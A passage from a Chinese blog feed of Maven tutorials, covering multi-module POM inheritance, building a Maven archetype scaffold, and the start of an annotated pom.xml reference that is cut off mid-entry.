<p>Maven的坐标GAV（groupId, artifactId,<br>version）在这里进行配置，这些都是必须的。特殊的地方在于，这里的packaging为pom。所有带有子模块的项目的packaging都为pom。packaging如果不进行配置，它的默认值是jar，代表Maven会将项目打成一个jar包。</p>
<p>该配置重要的地方在于modules，例子中包含的子模块有app-util, app-dao,<br>app-service, app-war。在Maven build<br>app-parent的时候，它会根据子模块的相互依赖关系整理一个build顺序，然后依次build。</p>
<p>这就是一个父模块大概需要的配置，接下来看一下子模块符合配置继承父模块。、</p>
<pre><code>        app-parent
        org.myorg.myapp
        1.0-SNAPSHOT
    
    4.0.0
    app-util
    
        
            commons-lang
            commons-lang
            2.4
        
    
</code></pre>
<p>app-util模块继承了app-parent父模块，因此这个POM的一开始就声明了对app-parent的引用，该引用是通过Maven坐标GAV实现的。而关于项目app-util本身，它却没有声明完整GAV，这里我们只看到了artifactId。这个POM并没有错，groupId和version默认从父模块继承了。实际上子模块从父模块继承一切东西，包括依赖，插件配置等等。</p>
<p>此外app-util配置了一个对于commons-lang的简单依赖，这是最简单的依赖配置形式。大部分情况，也是通过GAV引用的。</p>
<p>再看一下app-dao，它也是继承于app-parent，同时依赖于app-util：</p>
<pre><code>        app-parent
        org.myorg.myapp
        1.0-SNAPSHOT
    
    4.0.0
    app-dao
    
        
            org.myorg.myapp
            app-util
            $&#123;project.version&#125;
        
    
</code></pre>
<p>该配置和app-util的配置几乎没什么差别，不同的地方在于，依赖变化了，app-dao依赖于app-util。这里要注意的是version的值为${project.version}，这个值是一个属性引用，指向了POM的project&#x2F;version的值，也就是这个POM对应的version。由于app-dao的version继承于app-parent，因此它的值就是1.0-SNAPSHOT。而app-util也继承了这个值，因此在所有这些项目中，我们做到了保持版本一致。</p>
<p>这里还需要注意的是，app-dao依赖于app-util，而app-util又依赖于commons-lang，根据传递性，app-dao也拥有了对于commons-lang的依赖。</p>
<p>app-service我们跳过不谈，它依赖于app-dao。我们最后看一下app-web：</p>
<pre><code>        app-parent
        org.myorg.myapp
        1.0-SNAPSHOT
    
    4.0.0
    app-web
    war
    
        
            org.myorg.myapp
            app-service
            $&#123;project.version&#125;
        
    
</code></pre>
<p>app-web依赖于app-service，因此配置了对其的依赖。</p>
<p>由于app-web是我们最终要部署的应用，因此它的packaging是war。为此，你需要有一个目录src&#x2F;main&#x2F;webapp。并在这个目录下拥有web应用需要的文件，如&#x2F;WEB-INF&#x2F;web.xml。没有web.xml，Maven会报告build失败，此外你可能还会有这样一些子目录：&#x2F;js,<br>&#x2F;img, &#x2F;css ... 。</p>
<p> </p>
<p>看看Maven是如何build整个项目的，我们在 app-parent 根目录中运行 mvn clean<br>install ，输出的末尾会有大致这样的内容：</p>
<pre><code>...
...
[INFO] [war:war]
[INFO] Packaging webapp
[INFO] Assembling webapp[app-web] in [/home/juven/workspaces/ws-others/myapp/app-web/target/app-web-1.0-SNAPSHOT]
[INFO] Processing war project
[INFO] Webapp assembled in[50 msecs]
[INFO] Building war: /home/juven/workspaces/ws-others/myapp/app-web/target/app-web-1.0-SNAPSHOT.war
[INFO] [install:install]
[INFO] Installing /home/juven/workspaces/ws-others/myapp/app-web/target/app-web-1.0-SNAPSHOT.war to /home/juven/.m2/repository/org/myorg/myapp/app-web/1.0-SNAPSHOT/app-web-1.0-SNAPSHOT.war
[INFO] 
[INFO] 
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Summary:
[INFO] ------------------------------------------------------------------------
[INFO] app-parent ............................................ SUCCESS [1.191s]
[INFO] app-util .............................................. SUCCESS [1.274s]
[INFO] app-dao ............................................... SUCCESS [0.583s]
[INFO] app-service ........................................... SUCCESS [0.593s]
[INFO] app-web ............................................... SUCCESS [0.976s]
[INFO] ------------------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESSFUL
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 4 seconds
[INFO] Finished at: Sat Dec 27 08:20:18 PST 2008
[INFO] Final Memory: 3M/17M
[INFO] ------------------------------------------------------------------------
</code></pre>
<p>注意Reactor<br>Summary，整个项目根据我们希望的顺序进行build。Maven根据我们的依赖配置，智能的安排了顺序，app-util,<br>app-dao, app-service, app-web。</p>
<p> </p>
<p>最后，你可以在 app-web&#x2F;target 目录下找到文件 app-web-1.0-SNAPSHOT.war<br>，打开这个war包，在 &#x2F;WEB-INF&#x2F;lib 目录看到了<br>commons-lang-2.4.jar，以及对应的app-util, app-dao, app-service<br>的jar包。Maven自动帮你处理了打包的事情，并且根据你的依赖配置帮你引入了相应的jar文件。</p>
<p>使用多模块的Maven配置，可以帮助项目划分模块，鼓励重用，防止POM变得过于庞大，方便某个模块的构建，而不用每次都构建整个项目，并且使得针对某个模块的特殊控制更为方便。本文同时给出了一个实际的配置样例，展示了如何使用Maven配置多模块项目。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title>开发一个maven脚手架</title>
    <url>/blog/tools/maven/dn-cst-maven-archtype/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>开发新项目就需要搭建新工程，但是搭建新工程的这个过程是非常繁琐浪费时间的，并且不可避免的需要踩坑。更可怕的是，如果是在一个团队中，每新起一个项目都由不同的开发人员去自定义的搭建工程结构，那么对后续的统一管理，监控，运维简直是灾难。基于以上几点，团队内部其实是非常有必要搭建一个统一的脚手架来供统一使用</p>
<h1 id="制作一个脚手架"><a href="#制作一个脚手架" class="headerlink" title="制作一个脚手架"></a>制作一个脚手架</h1><p>下面我们就来详细的介绍如何搭建一个maven工程的脚手架</p>
<p>要搭建脚手架，首先我们需要一个模板工程，这个模板工程一般来说会集成一些工具类，底层中间件，通用配置，并且要有良好的分层结构等。需要能够达到开箱即用的程度。</p>
<p>以下是一个模板工程的目录结构，也是目前我们团队内部的标准化结构</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── example-client</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── example-core</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── example-server</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── example-test</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── Jenkinsfile</span><br><span class="line">├── README.md</span><br><span class="line">├── .gitignore</span><br><span class="line">└── pom.xml</span><br></pre></td></tr></table></figure>

<p>完成模板工程的搭建后，需要在模板工程的最外层 pom 文件加入以下配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-archetype-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完成之后在根目录下执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn archetype:create-from-project</span><br></pre></td></tr></table></figure>

<p>刷新项目后，会发现在 <code>./target/generated-sources/archetype</code>目录下生成了脚手架工程，生成的脚手架工程可以当成是一个独立的项目，目录结构如下图</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── pom.xml</span><br><span class="line">├── src</span><br><span class="line">│   ├── main</span><br><span class="line">│   │   └── resources</span><br><span class="line">│   │       ├── META-INF</span><br><span class="line">│   │       │   └── maven</span><br><span class="line">│   │       │       └── archetype-metadata.xml</span><br><span class="line">│   │       └── archetype-resources</span><br><span class="line">│   │           ├── Jenkinsfile</span><br><span class="line">│   │           ├── README.md</span><br><span class="line">│   │           ├── __artifactId__.iml</span><br><span class="line">│   │           ├── __rootArtifactId__-client</span><br><span class="line">│   │           │   ├── __parentArtifactId__-client.iml</span><br><span class="line">│   │           │   ├── pom.xml</span><br><span class="line">│   │           │   └── src</span><br><span class="line">│   │           ├── __rootArtifactId__-core</span><br><span class="line">│   │           │   ├── __parentArtifactId__-core.iml</span><br><span class="line">│   │           │   ├── pom.xml</span><br><span class="line">│   │           │   └── src</span><br><span class="line">│   │           ├── __rootArtifactId__-server</span><br><span class="line">│   │           │   ├── __parentArtifactId__-server.iml</span><br><span class="line">│   │           │   ├── pom.xml</span><br><span class="line">│   │           │   └── src</span><br><span class="line">│   │           ├── __rootArtifactId__-<span class="built_in">test</span></span><br><span class="line">│   │           │   ├── __parentArtifactId__-test.iml</span><br><span class="line">│   │           │   ├── pom.xml</span><br><span class="line">│   │           │   └── src</span><br><span class="line">│   │           └── pom.xml</span><br><span class="line">│   └── <span class="built_in">test</span></span><br><span class="line">│       └── resources</span><br><span class="line">│           └── projects</span><br><span class="line">│               └── basic</span><br><span class="line">│                   ├── archetype.properties</span><br><span class="line">│                   └── goal.txt</span><br></pre></td></tr></table></figure>

<p>在脚手架工程目录下执行 mvn install 就完成了脚手架的本地安装，安装完成之后，这个脚手架在本地就可以使用了<br>可以执行以下脚本来通过此脚手架创建项目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn archetype:generate -DgroupId=com.xxx.example -DartifactId=xxxx -Dpackage=com.xxx.example -DarchetypeGroupId=com.demo.archetype -DarchetypeArtifactId=demo-archetype -DarchetypeVersion=1.0.0-SNAPSHOT -DinteractiveMode=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h1 id="扫坑"><a href="#扫坑" class="headerlink" title="扫坑"></a>扫坑</h1><p>不过如果我们直接这样使用的话，会发现生成了很多我们并不想要它出现的文件，比如 .idea .iml 文件等等，并且 .gitignore 文件也诡异的消失了（不知为何会忽略这个文件？？）… 这显然不是成熟的脚手架了。那么就需要对它做一些额外的配置了</p>
<p>有两种方式可以解决上面出现的问题</p>
<ol>
<li>将 <code>.gitignore</code>文件重命名为 <code>__gitignore__</code>，然后在模板工程根目录下新建 <code>archetype.properties</code> 文件，并填入以下内容</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## generate for archetype-metadata.xml</span></span><br><span class="line">excludePatterns=archetype.properties,*.iml,.idea/,.idea/libraries,logs/,build.sh</span><br><span class="line"><span class="comment">## generate .gitignore file</span></span><br><span class="line">gitignore=.gitignore</span><br></pre></td></tr></table></figure>

<p>完成上述配置后，重新执行 <code>mvn archetype:create-from-project</code> 生成脚手架工程。再完成本地安装，上面出现的问题就会解决</p>
<ol start="2">
<li>第二种方式本质上和第一种方式是一样的，只是第二种方式是直接修改脚手架工程的配置文件。第一种方式相当于是执行  <code>mvn archetype:create-from-project</code> 时读取了 <code>archetype.properties</code> 帮我们做了配置文件的修改。</li>
</ol>
<p>maven的脚手架工程下有两个重要的配置文件</p>
<ul>
<li><p>.&#x2F;src&#x2F;test&#x2F;resources&#x2F;projects&#x2F;basic&#x2F;archetype.properties</p>
<ul>
<li>这里可以加入自定义变量，如  gitignore 变量</li>
</ul>
</li>
<li><p>.&#x2F;src&#x2F;main&#x2F;resources&#x2F;META-INF&#x2F;maven&#x2F;archetype-metadata.xml</p>
</li>
</ul>
<p>下面是一个典型的archetype-metadata.xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">archetype-descriptor</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/plugins/maven-archetype-plugin/archetype-descriptor/1.0.0 http://maven.apache.org/xsd/archetype-descriptor-1.0.0.xsd&quot;</span> <span class="attr">name</span>=<span class="string">&quot;example&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/plugins/maven-archetype-plugin/archetype-descriptor/1.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">requiredProperties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requiredProperty</span> <span class="attr">key</span>=<span class="string">&quot;gitignore&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">defaultValue</span>&gt;</span>.gitignore<span class="tag">&lt;/<span class="name">defaultValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requiredProperty</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requiredProperty</span> <span class="attr">key</span>=<span class="string">&quot;port&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">defaultValue</span>&gt;</span>8888<span class="tag">&lt;/<span class="name">defaultValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requiredProperty</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">requiredProperties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span><span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>__gitignore__<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>README.md<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>Jenkinsfile<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>pom.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span> <span class="attr">id</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-client&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;__rootArtifactId__-client&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-client&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">packaged</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span> <span class="attr">id</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-core&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;__rootArtifactId__-core&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-core&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">packaged</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span> <span class="attr">id</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-server&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;__rootArtifactId__-server&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-server&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">packaged</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources/META-INF/dubbo<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fileSet</span> <span class="attr">filtered</span>=<span class="string">&quot;true&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span> <span class="attr">id</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-test&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;__rootArtifactId__-test&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$&#123;rootArtifactId&#125;-test&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archetype-descriptor</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="archetype-metadata-xml-结构"><a href="#archetype-metadata-xml-结构" class="headerlink" title="archetype-metadata.xml 结构"></a>archetype-metadata.xml 结构</h2><p>简单介绍archetype-metadata.xml文件的基本结构</p>
<ul>
<li><code>&lt;requiredProperties&gt;</code>是属性变量定义层，在这里定义的变量可以在archetype工程文件中通过 <code>$&#123;xxx&#125;</code> 来进行引用，文件名则可以通过 <code>__xxx__</code>来引用变量（这就是为什么要把<code>.gitignore</code>重命名为<code>__gitignore__</code>）。变量在执行 <code>mvn archetype:generate</code>时才录入真正内容</li>
<li>再往下其实就是定义将要生成的工程目录结构，首先是一个 <code>fileSets</code> （包含多个 <code>fileSet</code>标签）标签定义了根目录需要生成哪些文件，再通过多个 <code>modules</code> 标签来定义多个子模块（如果是多模块工程的话）。这其中比较重要的其实还是 <code>fileSet</code>标签，fileSet有两个重要的属性<ul>
<li>filtered &#x3D; true 如果为true，则该 <code>fileSet</code>包含的文件中的 <code>$&#123;&#125;</code> 占位符会被替换成相应的变量</li>
<li>packaged &#x3D; true 如果为true，则 <code>src/main/java</code> 下得文件内容会被加入 指定包路径下</li>
</ul>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个优秀少坑的脚手架还是能极大的提升生产力的，毕竟这种重复且无价值的劳动我们还是交给工具吧</p>
]]></content>
      <categories>
        <category>maven</category>
      </categories>
      <tags>
        <tag>maven</tag>
        <tag>archtype</tag>
      </tags>
  </entry>
  <entry>
    <title>MAVEN pom.xml 详解</title>
    <url>/blog/tools/maven/pomdesc/</url>
    <content><![CDATA[<h3 id="pom-xml详解"><a href="#pom-xml详解" class="headerlink" title="pom.xml详解"></a>pom.xml详解</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0http://maven.apache.org/maven-v4_0_0.xsd&quot;&gt;</span><br><span class="line">    &lt;!--父项目的坐标。如果项目中没有规定某个元素的值，那么父项目中的对应值即为项目的默认值。 坐标包括group ID，artifact ID和 version。--&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">     &lt;!--被继承的父项目的构件标识符--&gt;</span><br><span class="line">     &lt;artifactId/&gt;</span><br><span class="line">     &lt;!--被继承的父项目的全球唯一标识符--&gt;</span><br><span class="line">     &lt;groupId/&gt;</span><br><span class="line">     &lt;!--被继承的父项目的版本--&gt;</span><br><span class="line">     &lt;version/&gt;</span><br><span class="line">     &lt;!-- 父项目的pom.xml文件的相对路径。相对路径允许你选择一个不同的路径。默认值是../pom.xml。Maven首先在构建当前项目的地方寻找父项 目的pom，其次在文件系统的这个位置（relativePath位置），然后在本地仓库，最后在远程仓库寻找父项目的pom。--&gt;</span><br><span class="line">     &lt;relativePath/&gt;</span><br><span class="line"> &lt;/parent&gt;</span><br><span class="line"> &lt;!--声明项目描述符遵循哪一个POM模型版本。模型本身的版本很少改变，虽然如此，但它仍然是必不可少的，这是为了当Maven引入了新的特性或者其他模型变更的时候，确保稳定性。--&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;!--项目的全球唯一标识符，通常使用全限定的包名区分该项目和其他项目。并且构建时生成的路径也是由此生成， 如com.mycompany.app生成的相对路径为：/com/mycompany/app--&gt;</span><br><span class="line">    &lt;groupId&gt;cn.erhuowang&lt;/groupId&gt;</span><br><span class="line">    &lt;!-- 构件的标识符，它和group ID一起唯一标识一个构件。换句话说，你不能有两个不同的项目拥有同样的artifact ID和groupID；在某个 特定的group ID下，artifact ID也必须是唯一的。构件是项目产生的或使用的一个东西，Maven为项目产生的构件包括：JARs，源 码，二进制发布和WARs等。--&gt;</span><br><span class="line">    &lt;artifactId&gt;erhuowang-maven2&lt;/artifactId&gt;</span><br><span class="line">    &lt;!--项目产生的构件类型，例如jar、war、ear、pom。插件可以创建他们自己的构件类型，所以前面列的不是全部构件类型--&gt;</span><br><span class="line">    &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line">    